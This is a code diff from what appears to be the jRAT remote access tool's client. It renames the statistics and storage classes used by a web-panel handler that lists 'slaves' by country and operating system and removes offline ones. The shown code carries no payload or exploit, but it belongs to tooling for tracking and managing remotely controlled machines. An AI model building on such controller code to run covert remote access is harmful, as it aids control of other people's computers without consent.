@@ -11,11 +11,11 @@ import se.jrat.client.Constants;
 import se.jrat.client.Main;
 import se.jrat.client.OfflineSlave;
 import se.jrat.client.exceptions.CloseException;
-import se.jrat.client.settings.CountryStatistics;
-import se.jrat.client.settings.CountryStatistics.CountryStatEntry;
-import se.jrat.client.settings.OfflineSlaves;
-import se.jrat.client.settings.OperatingSystemStatistics;
-import se.jrat.client.settings.OperatingSystemStatistics.OperatingSystemStatEntry;
+import se.jrat.client.settings.StatisticsCountry;
+import se.jrat.client.settings.StatisticsCountry.CountryStatEntry;
+import se.jrat.client.settings.StoreageOfflineSlaves;
+import se.jrat.client.settings.StatisticsOperatingSystem;
+import se.jrat.client.settings.StatisticsOperatingSystem.OperatingSystemStatEntry;
 
 public class WebPanelConnection implements Runnable {
 
@@ -78,8 +78,8 @@ public class WebPanelConnection implements Runnable {
                 } else if (packet == WebPanelPackets.PACKET_LISTCOUNTRIES) {
                 	StringBuilder sb = new StringBuilder();
 
-                	for (int i = 0; i < CountryStatistics.getGlobal().getList().size(); i++) {
-            			CountryStatEntry entry = CountryStatistics.getGlobal().getList().get(i);
+                	for (int i = 0; i < StatisticsCountry.getGlobal().getList().size(); i++) {
+            			CountryStatEntry entry = StatisticsCountry.getGlobal().getList().get(i);
             			try {            				
             				sb.append(entry.getCountry() + "," + entry.getConnects());
             				sb.append(";");
@@ -93,8 +93,8 @@ public class WebPanelConnection implements Runnable {
                 } else if (packet == WebPanelPackets.PACKET_LISTOPERATINGSYSTEMS) {
                 	StringBuilder sb = new StringBuilder();
 
-                	for (int i = 0; i < OperatingSystemStatistics.getGlobal().getList().size(); i++) {
-            			OperatingSystemStatEntry entry = OperatingSystemStatistics.getGlobal().getList().get(i);
+                	for (int i = 0; i < StatisticsOperatingSystem.getGlobal().getList().size(); i++) {
+            			OperatingSystemStatEntry entry = StatisticsOperatingSystem.getGlobal().getList().get(i);
             			try {            				
             				sb.append(entry.getOperatingSystem().getType().getName() + "," + entry.getConnects());
             				sb.append(";");
@@ -133,7 +133,7 @@ public class WebPanelConnection implements Runnable {
                 	Main.instance.repaint();
                 } else if (packet == WebPanelPackets.PACKET_LISTOFFLINE) {            	
                 	StringBuilder sb = new StringBuilder();
-                	for (OfflineSlave os : OfflineSlaves.getGlobal().getList()) {
+                	for (OfflineSlave os : StoreageOfflineSlaves.getGlobal().getList()) {
                 		if (!os.isOnline()) {
                 			sb.append(os.getString() + ";");
                 		}
@@ -144,7 +144,7 @@ public class WebPanelConnection implements Runnable {
                 } else if (packet == WebPanelPackets.PACKET_REMOVE_OFFLINE) {
                 	long id = Long.parseLong(readLine());
                 	
-                	OfflineSlaves.getGlobal().remove(id);
+                	StoreageOfflineSlaves.getGlobal().remove(id);
                 }
             }
 
